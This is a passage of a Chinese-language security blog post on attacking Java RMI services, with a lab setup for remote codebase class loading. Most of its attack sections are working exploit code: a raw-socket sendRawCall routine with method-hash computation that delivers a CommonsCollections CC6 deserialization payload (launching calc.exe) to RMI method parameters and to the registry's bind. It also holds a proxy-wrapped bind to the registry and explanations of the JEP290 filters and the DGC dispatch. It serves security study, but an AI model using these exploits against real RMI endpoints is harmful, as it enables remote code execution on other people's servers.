class="comment">//            Remote[] remoteObjList = rmiRegistry.packup(registry.list());</span></span><br><span class="line">            RemoteObjectWrapper[] rows = rmiRegistry.lookup(registry.list());</span><br><span class="line">            <span class="keyword">for</span> ( RemoteObjectWrapper row: rows) &#123;</span><br><span class="line">                System.out.println(row.className +<span class="string">&quot;\tport:&quot;</span> +  row.endpoint.getPort());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable t)&#123;</span><br><span class="line">            t.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-远程加载类"><a href="#2-远程加载类" class="headerlink" title="2. 远程加载类"></a>2. 远程加载类</h4><blockquote><p>codebase: 一个神奇的配置</p></blockquote><p>server</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegCalc</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>, <span class="string">&quot;vuln.policy&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Math</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Math</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;r&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RegCalc</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>client</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.dem0.rmi.ICalc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">codeBaseAttack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Payload</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;&#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>, <span class="string">&quot;vuln.policy&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>,<span class="string">&quot;http://192.168.59.1:9080/&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException, MalformedURLException &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc) Naming.lookup(<span class="string">&quot;rmi://192.168.59.1:1099/r&quot;</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        li.add(<span class="number">1</span>);</span><br><span class="line">        li.add(<span class="number">2</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vuln.policy</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为从远程codebase加载类具有高危性，所以只有满足如下条件的RMI客户端&#x2F;服务端才能被攻击：</p><ul><li>安装并配置了SecurityManager</li><li>设置了 java.rmi.server.useCodebaseOnly&#x3D;false 或者Java版本低于7u21、6u45(此时该值默认为false)</li></ul><h4 id="3-序列化安全问题"><a href="#3-序列化安全问题" class="headerlink" title="3.序列化安全问题"></a>3.序列化安全问题</h4><p>我们在debug的时候发现,在处理的时候，实际上对象是绑定在本地JVM中，只有函数参数和返回值是通过网络传送的，所以这几个部分就会设计到<code>序列化和反序列化</code>(网络传输的必备)</p><ul><li>参数</li><li>返回值</li><li><code>异常处理</code></li></ul><h5 id="远程方法参数反序列化-服务端远程参数是object和远程参数不是object"><a href="#远程方法参数反序列化-服务端远程参数是object和远程参数不是object" class="headerlink" title="远程方法参数反序列化(服务端远程参数是object和远程参数不是object)"></a>远程方法参数反序列化(<code>服务端</code>远程参数是object和远程参数不是object)</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.rmi;</span><br><span class="line"><span class="keyword">import</span> com.dem0.vuln.CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;192.168.59.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">            <span class="type">ICalc</span> <span class="variable">calc</span> <span class="operator">=</span> (ICalc) registry.lookup(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">            li.add(<span class="number">1</span>);</span><br><span class="line">            li.add(<span class="number">2</span>);</span><br><span class="line">            System.out.println(calc.equ(<span class="keyword">new</span> <span class="title class_">CC6</span>().getPayload(),<span class="number">1</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是在这里，我们有一个利用的前提，就是参数必须首先是<code>object</code>属性的，不然他是不是不会触发readObejct的，为了继续深入理解，我们继续看<code>UnicastServerRef#dispatch</code>所以我们知道这是一个分发接口的。偷一下<code>eki</code>大哥哥的简化流程</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//var4是传入的Method hash 拿到对应的method</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">var42</span> <span class="operator">=</span> (Method)<span class="built_in">this</span>.hashToMethod_Map.get(var4);</span><br><span class="line"><span class="comment">//var1是远程对象 var7是传入的参数输入流  调用this.unmarshalParameter对应的去反序列化成参数</span></span><br><span class="line">var9 = <span class="built_in">this</span>.unmarshalParameters(var1, var42, var7);</span><br><span class="line"><span class="comment">//最后调用方法得到结果</span></span><br><span class="line">var10 = var42.invoke(var1, var9);</span><br></pre></td></tr></table></figure><p>参数传入<code>unmarshalParameters</code>最后调用的<code>unmarshalValue</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    var0 ===&gt; type数组  var1===&gt; 参数的输入流</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title function_">unmarshalValue</span><span class="params">(Class&lt;?&gt; var0, ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (var0.isPrimitive()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (var0 == Integer.TYPE) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.readInt();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Boolean.TYPE) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.readBoolean();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Byte.TYPE) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.readByte();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Character.TYPE) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.readChar();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Short.TYPE) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.readShort();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Long.TYPE) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.readLong();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Float.TYPE) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.readFloat();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Double.TYPE) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.readDouble();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Unrecognized primitive type: &quot;</span> + var0);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">return</span> <span class="variable">var0</span> <span class="operator">=</span>= String.class &amp;&amp; var1 <span class="keyword">instanceof</span> ObjectInputStream ? SharedSecrets.getJavaObjectInputStreamReadString().readString((ObjectInputStream)var1) : var1.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到只要参数类型不是<code>var0.isPrimitive()</code>,和String 就会触发上面<code>readObject</code>，所以也可以攻击成功。</p><p>然后我们直接开整<code>javap  -s com.dem0.rmi.Math</code>,算出方法的描述符</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Compiled from <span class="string">&quot;Math.java&quot;</span></span><br><span class="line">public class com.dem0.rmi.Math extends java.rmi.server.UnicastRemoteObject implements com.dem0.rmi.IMath &#123;</span><br><span class="line">  protected com.dem0.rmi.Math() throws java.rmi.RemoteException;</span><br><span class="line">    descriptor: ()V</span><br><span class="line"></span><br><span class="line">  public java.lang.Integer <span class="built_in">sum</span>(java.util.List&lt;java.lang.Integer&gt;) throws java.rmi.RemoteException;</span><br><span class="line">    descriptor: (Ljava/util/List;)Ljava/lang/Integer;</span><br><span class="line"></span><br><span class="line">  public java.lang.Integer add(java.lang.Integer, java.lang.Integer) throws java.rmi.RemoteException;</span><br><span class="line">    descriptor: (Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 参数类型为非对象类型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sendRawCall</span><span class="params">(String host, <span class="type">int</span> port, ObjID objid, <span class="type">int</span> opNum, Long hash, Object ...objects)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> SocketFactory.getDefault().createSocket(host, port);</span><br><span class="line">    socket.setKeepAlive(<span class="literal">true</span>);</span><br><span class="line">    socket.setTcpNoDelay(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">DataOutputStream</span> <span class="variable">dos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">        dos = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(os);</span><br><span class="line"></span><br><span class="line">        dos.writeInt(TransportConstants.Magic);</span><br><span class="line">        dos.writeShort(TransportConstants.Version);</span><br><span class="line">        dos.writeByte(TransportConstants.SingleOpProtocol);</span><br><span class="line">        dos.write(TransportConstants.Call);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MarshalOutputStream</span>(dos);</span><br><span class="line"></span><br><span class="line">        objid.write(objOut); <span class="comment">//Objid</span></span><br><span class="line">        objOut.writeInt(opNum); <span class="comment">// opnum</span></span><br><span class="line">        objOut.writeLong(hash); <span class="comment">// hash</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Object object:</span><br><span class="line">                objects) &#123;</span><br><span class="line">            objOut.writeObject(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        os.flush();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (dos != <span class="literal">null</span>) &#123;</span><br><span class="line">            dos.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (socket != <span class="literal">null</span>) &#123;</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">long</span> <span class="title function_">computeMethodHash</span><span class="params">(String methodSignature)</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">sink</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>(<span class="number">127</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;SHA&quot;</span>);</span><br><span class="line">        <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(<span class="keyword">new</span> <span class="title class_">DigestOutputStream</span>(sink, md));</span><br><span class="line"></span><br><span class="line">        out.writeUTF(methodSignature);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// use only the first 64 bits of the digest for the hash</span></span><br><span class="line">        out.flush();</span><br><span class="line">        <span class="type">byte</span> hasharray[] = md.digest();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Math.min(<span class="number">8</span>, hasharray.length); i++) &#123;</span><br><span class="line">            hash += ((<span class="type">long</span>) (hasharray[i] &amp; <span class="number">0xFF</span>)) &lt;&lt; (i * <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ignore) &#123;</span><br><span class="line">        <span class="comment">/* can&#x27;t happen, but be deterministic anyway. */</span></span><br><span class="line">        hash = -<span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException complain) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(complain.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">genpayload2</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ReflectUtils.enableCustomRMIClassLoader();</span><br><span class="line">        PluginSystem.init(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">RMIRegistryEndpoint</span> <span class="variable">rmiRegistry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIRegistryEndpoint</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//还记得遍历攻击里我们实现的无依赖获取远程对象存根吗，这里直接套用了。</span></span><br><span class="line">        <span class="type">RemoteObjectWrapper</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectWrapper</span>(rmiRegistry.lookup(<span class="string">&quot;r&quot;</span>),<span class="string">&quot;math&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payloadObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CC6</span>().getPayload();</span><br><span class="line">        <span class="comment">//methodSignature 可以通过javap -s 类名计算</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">methodSignature</span> <span class="operator">=</span> <span class="string">&quot;add(Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;&quot;</span>;</span><br><span class="line">        <span class="type">Long</span> <span class="variable">methodHash</span> <span class="operator">=</span> computeMethodHash(methodSignature);</span><br><span class="line">        sendRawCall(remoteObj.getHost(),remoteObj.getPort(),remoteObj.objID,-<span class="number">1</span>,methodHash,payloadObj);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Throwable t)&#123;</span><br><span class="line">        t.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>unmarshalParameters</code>中有<code>DeserializationChecker</code>。所以还是可以避免的</p><h5 id="远程方法参数反序列化2-注册中心Registry提供的远程方法"><a href="#远程方法参数反序列化2-注册中心Registry提供的远程方法" class="headerlink" title="远程方法参数反序列化2(注册中心Registry提供的远程方法)"></a>远程方法参数反序列化2(注册中心Registry提供的远程方法)</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttackBind</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ReflectUtils.enableCustomRMIClassLoader();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">payloadObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CC6</span>().getPayload();</span><br><span class="line">            <span class="type">ObjID</span> <span class="variable">objID_</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="number">0</span>);</span><br><span class="line">            sendRawCall(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>,objID_,<span class="number">0</span>,<span class="number">4905912898345647071L</span>,<span class="string">&quot;Test&quot;</span>,payloadObj);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable t)&#123;</span><br><span class="line">            t.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>众所周知，在<code>JEP290</code>出来之前，这个是没有问题的。在其出来之后，主要的过滤点在与</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Status <span class="title function_">registryFilter</span><span class="params">(FilterInfo var0)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (registryFilter != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Status</span> <span class="variable">var1</span> <span class="operator">=</span> registryFilter.checkInput(var0);</span><br><span class="line">        <span class="keyword">if</span> (var1 != Status.UNDECIDED) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (var0.depth() &gt; <span class="number">20L</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> Status.REJECTED;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var2</span> <span class="operator">=</span> var0.serialClass();</span><br><span class="line">        <span class="keyword">if</span> (var2 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!var2.isArray()) &#123;</span><br><span class="line">                <span class="keyword">return</span> String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> var0.arrayLength() &gt;= <span class="number">0L</span> &amp;&amp; var0.arrayLength() &gt; <span class="number">1000000L</span> ? Status.REJECTED : Status.UNDECIDED;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Status.UNDECIDED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哦豁，没得搞了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> CC6.getPayloadObject(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;whatever&quot;</span>, payload);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span>  Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span>  <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, map);</span><br><span class="line"><span class="type">Remote</span> <span class="variable">obj</span> <span class="operator">=</span> (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, invocationHandler);</span><br><span class="line">registry.bind(<span class="string">&quot;evil&quot;</span>, obj);</span><br></pre></td></tr></table></figure><h5 id="远程函数返回值导致的反序列化"><a href="#远程函数返回值导致的反序列化" class="headerlink" title="远程函数返回值导致的反序列化"></a>远程函数返回值导致的反序列化</h5><p>起一个RMI服务，然后返回值是恶意对象，利用就GG。但是这个攻击手段感觉其实没有什么用….</p><p>但是我们在测试的时候，发现<code>sun.rmi.server.UnicastServerRef#dispatch</code>除了会传入我们使用的远程对象，还会传入一个<code>DGC_Impl</code>的远程对象,这其实就是类似<code>Registry_Impl</code>的一个远程对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (var4 != -<span class="number">669196253586618813L</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">DGCImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (DGCImpl)var1;</span><br><span class="line">            ObjID[] var7;</span><br><span class="line">            <span class="type">long</span> var8;</span><br><span class="line">            <span class="keyword">switch</span>(var3) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                VMID var39;</span><br><span class="line">                <span class="type">boolean</span> var41;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectInput</span> <span class="variable">var42</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                    var7 = (ObjID[])((ObjID[])var42.readObject());</span><br><span class="line">                    var8 = var42.readLong();</span><br><span class="line">                    var39 = (VMID)var42.readObject();</span><br><span class="line">                    var41 = var42.readBoolean();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var36) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var36);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var37) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var37);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.clean(var7, var8, var39, var41);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var35) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var35);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                Lease var10;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectInput</span> <span class="variable">var11</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                    var7 = (ObjID[])((ObjID[])var11.readObject());</span><br><span class="line">                    var8 = var11.readLong();</span><br><span class="line">                    var10 = (Lease)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var32) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var32);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var33) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var33);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">Lease</span> <span class="variable">var40</span> <span class="operator">=</span> var6.dirty(var7, var8, var10);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var12</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var12.writeObject(var40);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var31) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var31);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到不论是调用远程的什么方法，都会涉及到返回结果的反序列化。</p><figure 